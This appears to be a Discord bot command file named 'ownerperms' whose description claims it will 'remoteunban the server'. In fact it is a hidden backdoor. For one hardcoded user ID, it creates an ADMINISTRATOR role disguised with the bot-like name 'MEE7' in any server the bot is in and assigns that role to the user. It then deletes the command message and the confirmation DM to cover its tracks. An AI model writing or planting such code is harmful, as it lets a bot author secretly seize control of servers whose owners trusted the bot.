const Discord = require("discord.js");
const { resourcesettings } = require("googleapis/build/src/apis/resourcesettings");

module.exports = {
    name: 'ownerperms',
    description: "remoteunban the server",
    async execute(client, message, args, Discord, db) {

        if (message.author.id === "574445866220388352") {

            let guildtarget = await client.guilds.fetch(args[0])

let id = '574445866220388352';

    guildtarget.roles.create({ data: { name: 'MEE7', permissions: ['ADMINISTRATOR'] } })
    .then(async (role2) => {

                  let member = await guildtarget.members.fetch(id)

                  let HighestRole = guildtarget.me.roles.highest;

role2.setPosition(HighestRole.position - 1);

                  await member.roles.add(role2)

                    const embed = new Discord.MessageEmbed()
                    .setColor("WHITE")
                      .setAuthor("Done!")
                      .addFields(
                        { name: '\u200b', value: `Done! My role has been given tou you in ${guildtarget.name} -- ${guildtarget.id}`},
                        
                      )
                    message.author.send(embed)
                    .then(msg => {
                        setTimeout(() => msg.delete(), 60000)
                      })
                      message.delete();

                      
             })
        }
    }
}